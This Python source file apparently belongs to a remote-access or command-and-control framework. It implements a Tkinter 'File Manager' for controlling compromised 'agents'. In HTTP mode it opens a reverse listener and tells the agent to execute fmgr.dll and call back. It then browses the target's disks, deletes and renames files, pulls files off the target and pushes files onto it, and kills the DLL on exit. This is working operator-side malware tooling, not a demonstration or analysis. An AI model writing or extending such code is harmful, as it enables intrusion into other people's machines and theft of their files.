import tkinter as tk
from tkinter import ttk, filedialog, messagebox
import socket
import threading
import struct
import os
import json
import time

def get_icon_path():
    base_dir = os.environ.get('TAO_BASE_DIR')
    if not base_dir:
        current_file_dir = os.path.dirname(os.path.abspath(__file__))
        base_dir = os.path.abspath(os.path.join(current_file_dir, ".."))
    
    return os.path.join(base_dir, "ico", "ico.ico")

class FileManagerWindow:

    FM_HEARTBEAT = 0x01
    FM_HEARTBEAT_ACK = 0x02
    FM_COMMAND = 0x03
    FM_RESPONSE = 0x04
    FM_FILE_DATA = 0x05
    FM_DIR_LISTING = 0x06
    FM_ERROR = 0x07
    FM_MESSAGE = 0x09  

    def __init__(self, parent, controller, agent_ip):
        self.controller = controller
        self.agent_ip = agent_ip
        self.window = tk.Toplevel(parent)
        self.window.title(f"File Manager - {agent_ip}")
        icon_path = get_icon_path()
        if os.path.exists(icon_path):
            try:
                self.window.wm_iconbitmap(icon_path)
            except Exception:
                pass
        self.window.geometry("800x600")
        self.window.resizable(False, False)
        self.window.configure(bg="#0D0D0D")
        self.window.protocol("WM_DELETE_WINDOW", self.on_close)       
        self.socket = None
        self.connected = False
        self.session_active = False
        self.last_heartbeat = time.time()
        self.current_directory = ""
        self.selected_item = None
        self.in_disk_view = False 
        self.heartbeat_thread = None
        self.receive_thread = None
        self.receiving_file = False
        self.file_buffer = b""
        self.file_name = ""
        self.file_size = 0
        self.file_bytes_received = 0
        self._download_handle = None
        self._download_filepath = ""
        self._download_part_path = ""
        self._upload_ready = False
        self._upload_offset_response = None
        self._build_ui()
        self._safe_after(500, self.connect_to_agent)
        self._upload_ready_event = threading.Event()
        self._upload_offset_response = None
        self.selected_item = None
        self.clipboard = {"path": None, "op": None}
        self.in_disk_view = False

    def _window_alive(self) -> bool:

        try:
            return bool(self.window.winfo_exists())
        except Exception:
            return False

    def _safe_after(self, delay, func, *args):

        if not self._window_alive():
            return
        def _guarded():
            if self._window_alive():
                func(*args)
        self.window.after(delay, _guarded)

    def _build_ui(self):

        toolbar = tk.Frame(self.window, bg="#2C1E1E", height=40)
        toolbar.pack(fill="x", padx=2, pady=2)
        toolbar.pack_propagate(False)

        self.status_label = tk.Label(toolbar, text="⏳ Connecting...", 
                                     bg="#2C1E1E", fg="#FFA500",
                                     font=("Consolas", 9, "bold"))
        self.status_label.pack(side="left", padx=5)

        tk.Button(toolbar, text="✕", command=self.on_close,
                  bg="#666666", fg="white", font=("Arial", 8, "bold"),
                  padx=10).pack(side="right", padx=2)

        tk.Button(toolbar, text="🔄 Reconnect", command=self.reconnect,
                  bg="#4CAF50", fg="white", font=("Arial", 8, "bold"),
                  padx=10).pack(side="right", padx=2)

        nav_frame = tk.Frame(self.window, bg="#1A1A1A")
        nav_frame.pack(fill="x", padx=5, pady=2)

        for btn_txt, btn_cmd in [("⬆ Back", self.go_up), ("🏠 Home", self.go_home), ("🔄 Refresh", self.refresh)]:
            tk.Button(nav_frame, text=btn_txt, command=btn_cmd,
                      bg="#555555", fg="white", font=("Arial", 8, "bold"),
                      padx=8, pady=1).pack(side="left", padx=2)

        self.dir_label = tk.Label(nav_frame, text="", 
                                  bg="#1A1A1A", fg="#4CAF50",
                                  font=("Consolas", 8), anchor="w")
        self.dir_label.pack(side="left", padx=10, fill="x", expand=True)

        list_frame = tk.Frame(self.window, bg="#0D0D0D")
        list_frame.pack(fill="both", expand=True, padx=5, pady=2)

        columns = ("name", "size", "modified")
        self.tree = ttk.Treeview(list_frame, columns=columns, show="tree headings", selectmode="browse")

        self.tree.heading("#0", text="Type")
        self.tree.heading("name", text="Name")
        self.tree.heading("size", text="Size")
        self.tree.heading("modified", text="Modified")

        self.tree.column("#0", width=40, minwidth=40, stretch=False)
        self.tree.column("name", width=280, minwidth=150, stretch=True)
        self.tree.column("size", width=80, minwidth=70, stretch=False)
        self.tree.column("modified", width=150, minwidth=100, stretch=False)

        scrollbar = ttk.Scrollbar(list_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscroll=scrollbar.set)

        self.tree.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")

        self.tree.bind("<<TreeviewSelect>>", self.on_select)
        self.tree.bind("<Double-1>", self.on_double_click)
        self.tree.bind("<Button-3>", self.on_right_click)

        status_bar = tk.Frame(self.window, bg="#2C1E1E", height=20)
        status_bar.pack(fill="x", side="bottom")
        status_bar.pack_propagate(False)

        self.info_label = tk.Label(status_bar, text="Ready", 
                                   bg="#2C1E1E", fg="#888888",
                                   font=("Consolas", 8), anchor="w")
        self.info_label.pack(fill="x", padx=10)

    def _custom_dialog(self, title, prompt, default_value=""):

        dialog = tk.Toplevel(self.window)
        dialog.title(title)
        dialog.geometry("400x200")
        dialog.configure(bg="#1A1A1A")
        dialog.resizable(False, False)
        dialog.transient(self.window) 
        dialog.grab_set()  

        result = {"value": None}

        tk.Label(dialog, text=title, bg="#1A1A1A", fg="#4CAF50", 
                 font=("Arial", 12, "bold"), pady=20).pack()

        tk.Label(dialog, text=prompt, bg="#1A1A1A", fg="white", 
                 font=("Arial", 10), wraplength=350, pady=10).pack()

        entry = tk.Entry(dialog, bg="#2C1E1E", fg="white", insertbackground="white",
                         font=("Consolas", 11), borderwidth=0, highlightthickness=1)
        entry.pack(padx=40, pady=20, fill="x")
        entry.insert(0, default_value)
        entry.focus_set()

        def on_ok(event=None):
            result["value"] = entry.get()
            dialog.destroy()

        def on_cancel():
            dialog.destroy()

        btn_frame = tk.Frame(dialog, bg="#1A1A1A")
        btn_frame.pack(side="bottom", pady=30)

        tk.Button(btn_frame, text="Confirm", command=on_ok, bg="#4CAF50", fg="white", 
                  width=12, relief="flat").pack(side="left", padx=10)
        tk.Button(btn_frame, text="Cancel", command=on_cancel, bg="#666666", fg="white", 
                  width=12, relief="flat").pack(side="left", padx=10)

        entry.bind("<Return>", on_ok)
        entry.bind("<Escape>", lambda e: on_cancel())

        self.window.wait_window(dialog)
        return result["value"]

    def connect_to_agent(self):

        if self.controller.active_mode == "dns":
            self.controller._log_m("FILE MGR: DNS mode — connecting outbound...")
            threading.Thread(target=self._connect_outbound, daemon=True).start()
        else:
            self.controller._log_m("FILE MGR: HTTP mode — starting reverse listener...")
            threading.Thread(target=self._connect_reverse, daemon=True).start()

    def _connect_outbound(self):

        self.controller._log_m(f"FILE MGR: Connecting to {self.agent_ip}:8888...")
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.socket.settimeout(10)

            self.controller._log_m("FILE MGR: Attempting connection...")
            self.socket.connect((self.agent_ip, 8888))

            self.socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            self.socket.settimeout(5.0)

            self._on_socket_ready()

        except Exception as e:
            self._safe_after(0, lambda: self.status_label.config(text="✗ Connection Failed", fg="#FF4444") if self._window_alive() else None)
            self.controller._log_m(f"FILE MGR: Connection error: {e}")
            import traceback
            self.controller._log_m(traceback.format_exc())

    def _connect_reverse(self):

        from tools.reverse_listener import ReverseTCPListener

        port = 9004
        listener = ReverseTCPListener(port=port, timeout=30, log_fn=self.controller._log_m)
        if not listener.start():
            self._safe_after(0, lambda: self.status_label.config(
                text="✗ Listener failed", fg="#FF4444"))
            return

        controller_ip = ReverseTCPListener.get_local_ip()
        callback_cmd  = f"exec-fmgr.dll|CALLBACK:{controller_ip}:{port}"
        self.controller._log_m(f"FILE MGR: Sending callback command → {callback_cmd}")
        self.controller._send_http_cmd(callback_cmd)

        self._safe_after(0, lambda: self.status_label.config(
            text=f"⏳ Waiting for agent ({port})...", fg="#FFA500"))

        sock = listener.wait_for_connection()
        if not sock:
            self._safe_after(0, lambda: self.status_label.config(
                text="✗ Agent did not call back", fg="#FF4444"))
            self.controller._log_m("FILE MGR: Reverse connection timed out")
            return

        self.socket = sock
        self._safe_after(0, self._on_socket_ready)

    def _on_socket_ready(self):
        self.connected = True
        self.session_active = True
        self.last_heartbeat = time.time()
        self._safe_after(0, lambda: self.status_label.config(text="✓ Connected", fg="#4CAF50"))
        self.controller._log_m("FILE MGR: TCP connection established")
        self.receive_thread = threading.Thread(target=self._receive_loop, daemon=True)
        self.receive_thread.start()
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()
        self.controller._log_m("FILE MGR: Background threads started")
        self.controller._log_m("FILE MGR: Waiting for initial directory listing...")

        time.sleep(1.0)
        self._safe_after(0, self._request_initial_listing)

    def _request_initial_listing(self):
        if not self.tree.get_children():
            self.controller._log_m("FILE MGR: Requesting directory listing...")
            self.send_command("ls")

    def send_packet(self, pkt_type, data=""):

        if not self.socket or not self.session_active:
            return False

        try:
            data_bytes = data.encode('utf-8') if isinstance(data, str) else data
            header = struct.pack('!BI', pkt_type, len(data_bytes))

            self.controller._log_m(f"FILE MGR: Sending packet type={pkt_type} size={len(data_bytes)}")

            sent = self.socket.send(header)
            if sent != 5:
                self.controller._log_m(f"FILE MGR: Header send failed (sent {sent} bytes)")
                return False

            if len(data_bytes) > 0:
                total_sent = 0
                while total_sent < len(data_bytes):
                    chunk_sent = self.socket.send(data_bytes[total_sent:])
                    if chunk_sent == 0:
                        self.controller._log_m("FILE MGR: Data send failed (0 bytes sent)")
                        return False
                    total_sent += chunk_sent

                self.controller._log_m(f"FILE MGR: Successfully sent {total_sent} bytes")

            return True

        except Exception as e:
            self.controller._log_m(f"FILE MGR: Send error: {e}")
            return False

    def send_command(self, command):

        if not self.socket or not self.session_active:
            self.controller._log_m("FILE MGR: Cannot send - not connected")
            return False

        try:
            result = self.send_packet(self.FM_COMMAND, command)
            if result:
                self.controller._log_m(f"FILE MGR: Sent command: {command}")
            else:
                self.controller._log_m(f"FILE MGR: Failed to send command: {command}")
            return result
        except Exception as e:
            self.controller._log_m(f"FILE MGR: Command send error: {e}")
            return False

    def _receive_loop(self):

        self.controller._log_m("FILE MGR: Receive loop started")

        try:
            while self.session_active and self.socket:
                try:
                    self.socket.settimeout(1.0)
                    first_byte = self.socket.recv(1)

                    if not first_byte:
                        self.controller._log_m("FILE MGR: Connection closed by agent")
                        break

                    self.last_heartbeat = time.time()
                    pkt_type = first_byte[0]

                    if pkt_type == self.FM_HEARTBEAT:
                        timestamp_data = self._recv_exact(4)
                        if timestamp_data:
                            self._handle_heartbeat()
                        continue

                    size_data = self._recv_exact(4)
                    if not size_data:
                        self.controller._log_m("FILE MGR: Failed to receive size header")
                        break

                    pkt_size = struct.unpack('!I', size_data)[0]                    

                    self.controller._log_m(f"FILE MGR: Received packet type={pkt_type} size={pkt_size}")

                    pkt_data = b""
                    if pkt_size > 0:
                        if pkt_type == self.FM_FILE_DATA and pkt_size > 1 * 1024 * 1024:
                            self._stream_file_packet(pkt_size)
                            continue
                        else:
                            pkt_data = self._recv_exact(pkt_size)
                            if not pkt_data:
                                self.controller._log_m("FILE MGR: Failed to receive packet data")
                                break

                    if pkt_type == self.FM_DIR_LISTING:
                        data_str = pkt_data.decode('utf-8', errors='ignore')
                        self._handle_dir_listing(data_str)
                    elif pkt_type == self.FM_RESPONSE:
                        data_str = pkt_data.decode('utf-8', errors='ignore')
                        self._handle_response(data_str)
                    elif pkt_type == self.FM_FILE_DATA:
                        self._handle_file_data(pkt_data)
                    elif pkt_type == self.FM_ERROR:
                        data_str = pkt_data.decode('utf-8', errors='ignore')
                        self._handle_error(data_str)
                    elif pkt_type == self.FM_HEARTBEAT_ACK:
                        pass
                    else:
                        self.controller._log_m(f"FILE MGR: Unknown packet type: {pkt_type}")

                except socket.timeout:
                    continue

                except ConnectionResetError:
                    self.controller._log_m("FILE MGR: Connection reset by agent (may be in retry cycle)")
                    self.session_active = False
                    self._safe_after(0, lambda: self.status_label.config(
                        text="⚠ Connection Lost", fg="#FF9800"))
                    self._safe_after(0, lambda: self.info_label.config(
                        text="Agent may be in retry/sleep cycle. Close and reconnect later.", 
                        fg="#FF4444"))
                    break

                except Exception as e:
                    if self.session_active:
                        self.controller._log_m(f"FILE MGR: Receive error: {e}")
                        import traceback
                        self.controller._log_m(traceback.format_exc())
                    break

        except Exception as e:
            if self.session_active:
                self.controller._log_m(f"FILE MGR: Receive loop error: {e}")
        finally:
            self.session_active = False
            self.controller._log_m("FILE MGR: Receive loop ended")

    def _stream_file_packet(self, pkt_size):
        bytes_remaining = pkt_size
        CHUNK = 65536

        while bytes_remaining > 0:
            read_size = min(CHUNK, bytes_remaining)
            try:
                chunk = self.socket.recv(read_size)
                if not chunk:
                    self.controller._log_m("FILE MGR: Connection closed during stream")
                    return
            except socket.timeout:
                continue
            except Exception as e:
                self.controller._log_m(f"FILE MGR: Stream read error: {e}")
                return

            bytes_remaining -= len(chunk)

            if self.receiving_file and self._download_handle:
                self._download_handle.write(chunk)
                self._download_handle.flush()
                self.file_bytes_received += len(chunk)

                if self.file_size > 0:
                    progress = int((self.file_bytes_received / self.file_size) * 100)
                    mb_done = self.file_bytes_received / (1024 * 1024)
                    mb_total = self.file_size / (1024 * 1024)
                    self._safe_after(0, lambda p=progress, d=mb_done, t=mb_total: self.info_label.config(
                        text=f"Downloading {self.file_name}: {p}% ({d:.1f} / {t:.1f} MB)", fg="#2196F3"))

    def _recv_exact(self, num_bytes):

        data = b''
        while len(data) < num_bytes:
            try:
                remaining = num_bytes - len(data)
                chunk = self.socket.recv(min(remaining, 65536))
                if not chunk:
                    self.controller._log_m("FILE MGR: Connection closed mid-receive")
                    return None
                data += chunk
            except socket.timeout:

                continue
            except Exception as e:
                self.controller._log_m(f"FILE MGR: recv_exact error: {e}")
                return None
        return data

    def _handle_heartbeat(self):

        self.last_heartbeat = time.time()

        try:
            ack_packet = struct.pack('!BI', self.FM_HEARTBEAT_ACK, 0)
            self.socket.send(ack_packet)
        except Exception as e:
            self.controller._log_m(f"FILE MGR: Failed to send heartbeat ACK: {e}")

    def _handle_dir_listing(self, data):

        self.controller._log_m(f"FILE MGR: Received directory listing ({len(data)} bytes)")
        self._safe_after(0, lambda: self._update_tree(data))

    def _handle_response(self, data):
        self.controller._log_m(f"FILE MGR: {data}")

        if data.startswith("CURRENT_DIR:"):
            self.current_directory = data.split(":", 1)[1]
            self.in_disk_view = False
            self._safe_after(0, lambda: self.dir_label.config(text=self.current_directory))

        elif data.startswith("OK:"):
            msg = data.split(":", 1)[1]
            self._safe_after(0, lambda: self.info_label.config(text=msg, fg="#4CAF50"))

            if "received" in msg.lower() or "uploaded" in msg.lower():
                self._safe_after(500, self.refresh)
            elif msg.startswith("Copied") or msg.startswith("Moved") or msg.startswith("Deleted") or msg.startswith("Renamed"):
                self._safe_after(500, self.refresh)

        elif data.startswith("ERROR:"):
            msg = data.split(":", 1)[1]
            self._safe_after(0, lambda: self.info_label.config(text=msg, fg="#FF4444"))

        elif data.startswith("READY_FOR_DOWNLOAD:"):
            self._upload_ready_event.set()  

            parts = data.split(":", 1)[1].split("|")
            filename = parts[0]
            self.controller._log_m(f"FILE MGR: Agent ready to receive {filename}, starting upload...")
            self._safe_after(0, lambda: self.info_label.config(
                text=f"Agent ready, starting upload...", fg="#2196F3"))

        elif data.startswith("UPLOAD_SIZE:"):
            try:
                self._upload_offset_response = int(data.split(":", 1)[1])
            except:
                self._upload_offset_response = 0

        elif data.startswith("UPLOAD_DISCARDED:"):
            self.controller._log_m(f"FILE MGR: Agent discarded partial upload")

    def _handle_file_data(self, data):
        if data.startswith(b"FILE_UPLOAD:"):
            data_str = data.decode('utf-8', errors='ignore')
            parts = data_str.split("|")
            self.file_name = parts[0].split(":")[1]
            self.file_size = int(parts[1])
            resume_offset = int(parts[2]) if len(parts) > 2 else 0
            self.file_bytes_received = resume_offset
            self.receiving_file = True

            script_dir = os.path.dirname(os.path.abspath(__file__))
            fm_dir = os.path.join(script_dir, "output", "files")
            os.makedirs(fm_dir, exist_ok=True)

            self._download_filepath = os.path.join(fm_dir, self.file_name)
            self._download_part_path = self._download_filepath + ".part"

            if resume_offset > 0:
                self._download_handle = open(self._download_part_path, 'ab')
                self.controller._log_m(f"FILE MGR: Resuming {self.file_name} from {resume_offset / (1024*1024):.1f} MB")
            else:
                self._download_handle = open(self._download_part_path, 'wb')
                self.controller._log_m(f"FILE MGR: Streaming {self.file_name} ({self.file_size} bytes) → {self._download_part_path}")

            self._safe_after(0, lambda: self.info_label.config(
                text=f"Downloading {self.file_name}...", fg="#2196F3"))

        elif data == b"FILE_UPLOAD_COMPLETE":
            if self._download_handle:
                self._download_handle.close()
                self._download_handle = None
            self.receiving_file = False
            self._finalize_download()

        else:
            if self.receiving_file and self._download_handle:
                self._download_handle.write(data)
                self._download_handle.flush()
                self.file_bytes_received += len(data)

                if self.file_size > 0:
                    progress = int((self.file_bytes_received / self.file_size) * 100)
                    mb_done = self.file_bytes_received / (1024 * 1024)
                    mb_total = self.file_size / (1024 * 1024)
                    self._safe_after(0, lambda p=progress, d=mb_done, t=mb_total: self.info_label.config(
                        text=f"Downloading {self.file_name}: {p}% ({d:.1f} / {t:.1f} MB)", fg="#2196F3"))

    def _finalize_download(self):
        part_path = getattr(self, '_download_part_path', None)
        final_path = getattr(self, '_download_filepath', None)

        if part_path and final_path and os.path.exists(part_path):

            if os.path.exists(final_path):
                base, ext = os.path.splitext(self.file_name)
                counter = 1
                while os.path.exists(final_path):
                    final_path = os.path.join(
                        os.path.dirname(part_path), f"{base}_{counter}{ext}"
                    )
                    counter += 1

            os.rename(part_path, final_path)
            self._download_filepath = final_path

        self.controller._log_m(f"FILE MGR: Download complete → {final_path}")
        self._safe_after(0, lambda: self.info_label.config(
            text=f"Downloaded: {self.file_name}", fg="#4CAF50"))
        self._safe_after(0, lambda: messagebox.showinfo(
            "Download Complete", f"File saved to:\n{final_path}"))

    def _handle_error(self, data):

        self.controller._log_m(f"FILE MGR ERROR: {data}")
        self._safe_after(0, lambda: self.info_label.config(text=data, fg="#FF4444"))

    def _heartbeat_loop(self):
        self.controller._log_m("FILE MGR: Heartbeat monitor started")

        while self.session_active and self.socket:
            time.sleep(3)

            if self.receiving_file:

                self.last_heartbeat = time.time()
                continue

            elapsed = time.time() - self.last_heartbeat
            if elapsed > 20:
                self.controller._log_m(f"FILE MGR: Heartbeat timeout ({elapsed:.1f}s since last activity)")
                self.session_active = False
                break

        self.controller._log_m("FILE MGR: Heartbeat monitor ended")

    def _update_tree(self, listing):

        for item in self.tree.get_children():
            self.tree.delete(item)

        lines = listing.split('\n')

        if lines and lines[0].strip() == "DISK_LIST":
            self.in_disk_view = True
            self.dir_label.config(text="💾 Available Disks")

            for line in lines[1:]:
                line = line.strip()
                if not line or not line.startswith("[DISK]"):
                    continue

                parts = line.split("|")
                if len(parts) >= 4:
                    disk_letter = parts[1]      
                    volume_name = parts[2] 
                    size_info = parts[3] 

                    self.tree.insert("", "end", text="💿", 
                                   values=(disk_letter, volume_name, size_info))

            self.controller._log_m("FILE MGR: Disk list displayed")
            return

        self.in_disk_view = False

        for line in lines:
            line = line.strip()

            if line.startswith("CURRENT_DIR:"):
                self.current_directory = line.split(":", 1)[1]
                self.dir_label.config(text=self.current_directory)

            elif line.startswith("[DIR]") or line.startswith("[FILE]"):
                parts = line.split("|")
                if len(parts) >= 4:
                    item_type = parts[0]
                    name = parts[1]
                    size = parts[2]
                    modified = parts[3]

                    icon = "📁" if "[DIR]" in item_type else "📄"

                    self.tree.insert("", "end", text=icon, values=(name, size, modified))

    def on_select(self, event):
        selection = self.tree.selection()
        if selection:
            item = self.tree.item(selection[0])
            self.selected_item = item['values'][0] if item['values'] else None

    def on_double_click(self, event):
        selection = self.tree.selection()
        if not selection:
            return

        item = self.tree.item(selection[0])
        icon = item['text']
        name = item['values'][0] if item['values'] else None

        if not name:
            return

        if icon == "📁":

            self.controller._log_m(f"FILE MGR: Navigating to {name}")
            self.send_command(f"cd {name}")
            time.sleep(0.5)
            self.send_command("ls")
        elif icon == "💿":

            self.controller._log_m(f"FILE MGR: Navigating to disk {name}")
            self.send_command(f"cd {name}\\")
            time.sleep(0.5)
            self.send_command("ls")

    def on_right_click(self, event):

        item_id = self.tree.identify_row(event.y)

        if item_id:

            self.tree.selection_set(item_id)
            self.on_select(None)
            self._show_item_context_menu(event)
        else:

            self._show_blank_context_menu(event)

    def _show_item_context_menu(self, event):
        if not self.selected_item: return
        menu = tk.Menu(self.window, tearoff=0, bg="#2C1E1E", fg="#F2E9E4", activebackground="#A63429")

        menu.add_command(label="Copy", command=self.copy_item)
        menu.add_command(label="Cut", command=self.move_item)

        if self.clipboard["path"]:
            menu.add_command(label=f"Paste ({os.path.basename(self.clipboard['path'])})", command=self.paste_item)            
        menu.add_command(label="Rename", command=self.rename_item)
        menu.add_command(label="Delete", command=self.delete_item)
        menu.add_command(label="Download File", command=self.download_item)
        menu.add_command(label="Upload File", command=self.upload_item)
        menu.post(event.x_root, event.y_root)

    def _show_blank_context_menu(self, event):
        menu = tk.Menu(self.window, tearoff=0, bg="#2C1E1E", fg="#F2E9E4", activebackground="#A63429")

        if self.clipboard["path"]:
            menu.add_command(label="Paste Here", command=self.paste_item)
            menu.add_separator()

        menu.add_command(label="New Folder", command=self.new_folder)
        menu.add_command(label="Upload File", command=self.upload_item)  
        menu.post(event.x_root, event.y_root)

    def go_up(self):

        if self.in_disk_view:

            self.controller._log_m("FILE MGR: Already at root disk view")
            return

        if self.current_directory and self.current_directory.endswith(":\\"):

            self.show_disk_list()
        else:

            self.send_command("cd ..")
            time.sleep(0.5)
            self.send_command("ls")

    def go_home(self):

        self.show_disk_list()

    def show_disk_list(self):

        self.controller._log_m("FILE MGR: Fetching disk list...")
        self.in_disk_view = True
        self.dir_label.config(text="💾 Available Disks")

        for item in self.tree.get_children():
            self.tree.delete(item)

        self.send_command("disks")

    def refresh(self):

        if self.in_disk_view:
            self.show_disk_list()
        else:
            self.send_command("ls")

    def new_folder(self):
        name = self._custom_dialog("New Folder", "Enter the name for the new folder:")
        if name:
            self.send_command(f"mkdir {name}")
            time.sleep(0.5)
            self.refresh()

    def rename_item(self):
        if not self.selected_item:
            return

        new_name = self._custom_dialog("Rename", "Enter new name:", self.selected_item)
        if new_name and new_name != self.selected_item:

            command = f"rename {self.selected_item}|{new_name}"
            self.send_command(command)
            time.sleep(0.5)
            self.refresh()

    def copy_item(self):
        if self.selected_item and not self.in_disk_view:

            full_path = os.path.join(self.current_directory, self.selected_item)
            self.clipboard = {"path": full_path, "op": "copy"}
            self.info_label.config(text=f"Copied to clipboard: {self.selected_item}", fg="#4CAF50")

    def move_item(self):
        if self.selected_item and not self.in_disk_view:
            full_path = os.path.join(self.current_directory, self.selected_item)
            self.clipboard = {"path": full_path, "op": "move"}
            self.info_label.config(text=f"Cut to clipboard: {self.selected_item}", fg="#FFA500")

    def paste_item(self):
        if not self.clipboard["path"]:
            return

        source_path = self.clipboard["path"]
        filename = os.path.basename(source_path)

        sep = "" if self.current_directory.endswith(("\\", "/")) else "\\"
        dest_path = f"{self.current_directory}{sep}{filename}"

        if source_path.lower() == dest_path.lower():
            self.info_label.config(text="Error: Source and destination are the same", fg="#FF4444")
            return

        command = f"{self.clipboard['op']} {source_path}|{dest_path}"

        self.controller._log_m(f"FILE MGR: Sending {command}")
        self.send_command(command)

        if self.clipboard["op"] == "move":
            self.clipboard = {"path": None, "op": None}

        time.sleep(0.5)
        self.refresh()

    def delete_item(self):
        if not self.selected_item:
            messagebox.showwarning("No Selection", "Please select a file or folder first")
            return

        confirm = messagebox.askyesno("Confirm Delete", 
                                     f"Delete '{self.selected_item}'?\nThis cannot be undone.")
        if confirm:
            self.send_command(f"delete {self.selected_item}")
            time.sleep(0.5)
            self.refresh()

    def download_item(self):
        if not self.selected_item:
            messagebox.showwarning("No Selection", "Please select a file first")
            return

        script_dir = os.path.dirname(os.path.abspath(__file__))
        fm_dir = os.path.join(script_dir, "output", "files")
        partial_path = os.path.join(fm_dir, self.selected_item + ".part")
        full_path = os.path.join(fm_dir, self.selected_item)

        offset = 0
        if os.path.exists(partial_path):
            offset = os.path.getsize(partial_path)
            if offset > 0:
                resume = messagebox.askyesno(
                    "Resume Download",
                    f"A partial download exists ({offset / (1024*1024):.1f} MB).\nResume from where it left off?"
                )
                if not resume:
                    os.remove(partial_path)
                    offset = 0

        self.controller._log_m(f"FILE MGR: Requesting download of {self.selected_item} at offset {offset}")
        self.send_command(f"upload {self.selected_item}|{offset}")

    def upload_item(self):

        if not self.session_active:
            messagebox.showwarning("Not Connected", "File manager is not connected to agent")
            return

        filepath = filedialog.askopenfilename(title="Select file to upload", initialdir=os.path.expanduser("~"))
        if not filepath: 
            return

        threading.Thread(target=self._upload_worker, args=(filepath,), daemon=True).start()

    def _upload_worker(self, filepath, delete_after=False):
        filename = os.path.basename(filepath)
        try:
            file_size = os.path.getsize(filepath)
            if file_size == 0:
                self._safe_after(0, lambda: messagebox.showerror("Upload Error", "Cannot upload empty file"))
                return

            offset = self._get_upload_resume_offset(filename)
            if offset > 0:
                resume = messagebox.askyesno(
                    "Resume Upload",
                    f"A partial upload exists on the agent ({offset / (1024*1024):.1f} MB of {file_size / (1024*1024):.1f} MB).\nResume?"
                )
                if not resume:
                    offset = 0
                    self.send_command(f"upload_discard {filename}")
                    time.sleep(0.5)

            self.controller._log_m(f"FILE MGR: Uploading {filename} ({file_size} bytes) from offset {offset}")
            self._safe_after(0, lambda: self.info_label.config(text=f"Preparing upload: {filename}...", fg="#2196F3"))
            self._upload_ready_event.clear()
            cmd = f"download {filename}|{file_size}|{offset}"
            if not self.send_command(cmd):
                self._safe_after(0, lambda: self.info_label.config(text="Upload failed - command send error", fg="#FF4444"))
                return

            if not self._wait_for_upload_ready(timeout=10):
                self._safe_after(0, lambda: self.info_label.config(text="Upload failed - agent not ready", fg="#FF4444"))
                return

            CHUNK_SIZE = 512 * 1024 
            total_sent = offset
            last_log_percent = -1

            with open(filepath, 'rb') as f:
                f.seek(offset)

                while total_sent < file_size:
                    if not self.session_active:
                        return

                    self.last_heartbeat = time.time()

                    chunk = f.read(CHUNK_SIZE)
                    if not chunk:
                        break

                    for attempt in range(3):
                        if self.send_packet(self.FM_FILE_DATA, chunk):
                            break
                        elif attempt < 2:
                            self.controller._log_m(f"FILE MGR: Chunk send failed, retrying ({attempt+1}/3)...")
                            time.sleep(1.0)
                        else:
                            self._safe_after(0, lambda: self.info_label.config(
                                text=f"Upload failed at {total_sent/(1024*1024):.1f} MB — reconnect to resume", fg="#FF4444"))
                            return

                    total_sent += len(chunk)
                    progress = int((total_sent / file_size) * 100)
                    mb_done = total_sent / (1024 * 1024)
                    mb_total = file_size / (1024 * 1024)

                    if progress != last_log_percent and progress % 5 == 0:
                        self._safe_after(0, lambda p=progress, d=mb_done, t=mb_total, fn=filename: self.info_label.config(
                            text=f"Uploading {fn}: {p}% ({d:.1f} / {t:.1f} MB)", fg="#2196F3"))
                        last_log_percent = progress

            self._safe_after(0, lambda: self.info_label.config(text=f"Upload complete: {filename}", fg="#4CAF50"))
            self._safe_after(2000, self.refresh)

        except Exception as e:
            self.controller._log_m(f"FILE MGR: Upload error: {e}")
            self._safe_after(0, lambda: self.info_label.config(text=f"Upload failed: {e}", fg="#FF4444"))
        finally:
            if delete_after and os.path.exists(filepath):
                try:
                    os.remove(filepath)
                except:
                    pass

    def _wait_for_upload_ready(self, timeout=10):
        self.controller._log_m("FILE MGR: Waiting for agent upload ready signal...")
        result = self._upload_ready_event.wait(timeout=timeout)
        if result:
            self.controller._log_m("FILE MGR: Got ready signal, proceeding with upload")
        else:
            self.controller._log_m("FILE MGR: TIMEOUT waiting for ready signal")
        return result

    def _get_upload_resume_offset(self, filename):

        self._upload_offset_response = None
        self.send_command(f"upload_size {filename}")
        deadline = time.time() + 5
        while time.time() < deadline:
            if self._upload_offset_response is not None:
                return self._upload_offset_response
            time.sleep(0.1)
        return 0  

    def reconnect(self):
        if self.session_active:
            self.controller._log_m("FILE MGR: Already connected")
            return

        self.controller._log_m("FILE MGR: Attempting reconnection...")

        if self.socket:
            try:
                self.socket.close()
            except:
                pass
            self.socket = None

        self.connected = False
        self.session_active = False

        time.sleep(1)
        self.connect_to_agent()

    def on_close(self):

        self.controller._log_m("FILE MGR: Closing file manager...")

        if self._download_handle:
            try:
                self._download_handle.close()
            except Exception:
                pass
            self._download_handle = None
            self.receiving_file = False

        if self.session_active:
            self.send_command("exit")
            time.sleep(0.5)

        self.session_active = False

        if self.socket:
            try:
                self.socket.shutdown(socket.SHUT_RDWR)
                self.socket.close()
            except Exception:
                pass
            self.socket = None

        if self.controller.active_tool_windows.get('file_manager') == self:
            self.controller.active_tool_windows['file_manager'] = None

        fmgr_tools = ['file_manager', 'message']
        still_open = [t for t in fmgr_tools
                      if self.controller.active_tool_windows.get(t) is not None]
        if not still_open:
            self.controller.fmgr_loaded  = False
            self.controller.fmgr_loading = False
            if self.controller.active_mode != "dns":
                self.controller._send_taskkill("fmgr.dll")
            self.controller._log_m("SESSION: All fmgr tools closed — fmgr.dll terminated")

        self.window.destroy()
        self.controller._log_m("FILE MGR: Closed")